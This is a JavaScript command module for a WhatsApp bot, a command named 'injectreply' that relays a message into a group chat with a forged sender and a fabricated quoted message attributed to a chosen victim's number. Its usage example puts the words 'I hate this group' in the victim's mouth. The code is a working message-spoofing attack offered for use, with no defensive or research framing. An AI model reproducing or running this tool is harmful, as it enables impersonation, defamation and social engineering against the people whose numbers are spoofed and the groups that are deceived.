module.exports = {
    name: "injectreply",
    aliases: ["fakereply", "spoofreply"],
    category: "spicy",
    permissions: { coin: 0, group: false, owner: true },
    code: async (ctx) => {
        try {
            const sock = ctx.core || ctx.sock || ctx.client;
            const args = ctx.args || [];

            // usage: .injectreply <spoofNumber> <victimNumber> <groupJid> <quoted text> | <reply text>
            // pipe | separates the "quoted message" from the "reply message"
            if (args.length < 4) {
                return await ctx.reply(
                    "*Usage:*\n" +
                    ".injectreply <spoofNum> <victimNum> <groupJid> <quoted text> | <reply text>\n\n" +
                    "*Example:*\n" +
                    ".injectreply 233111 233222 120363xxx@g.us I hate this group | same bro fr"
                );
            }

            const spoofNumber  = args[0].replace(/[^0-9]/g, "");
            const victimNumber = args[1].replace(/[^0-9]/g, "");
            const groupJid     = args[2];
            const rest         = args.slice(3).join(" ");

            const pipeIdx = rest.indexOf("|");
            if (pipeIdx === -1) {
                return await ctx.reply("❌ Missing | separator between quoted text and reply text.");
            }

            const quotedText = rest.slice(0, pipeIdx).trim();
            const replyText  = rest.slice(pipeIdx + 1).trim();

            const spoofedJid  = `${spoofNumber}@s.whatsapp.net`;
            const victimJid   = `${victimNumber}@s.whatsapp.net`;
            const fakeQuoteId = `FAKEQUOTE_${Date.now()}`;

            // build the context info that makes it look like a reply
            const contextInfo = {
                stanzaId: fakeQuoteId,
                participant: victimJid,
                quotedMessage: {
                    conversation: quotedText
                }
            };

            await sock.relayMessage(
                groupJid,
                {
                    extendedTextMessage: {
                        text: replyText,
                        contextInfo
                    }
                },
                {
                    messageId: `FAKE_${Date.now()}`,
                    participant: spoofedJid,
                    additionalAttributes: {
                        participant: spoofedJid
                    }
                }
            );

            await ctx.reply(
                `✅ Fake reply injected.\n` +
                `Spoofed sender: +${spoofNumber}\n` +
                `Appears to quote: +${victimNumber}\n` +
                `Quoted text: "${quotedText}"\n` +
                `Reply text: "${replyText}"`
            );

        } catch (e) {
            console.error("[injectreply]", e);
            await ctx.reply("❌ Failed: " + e.message);
        }
    }
};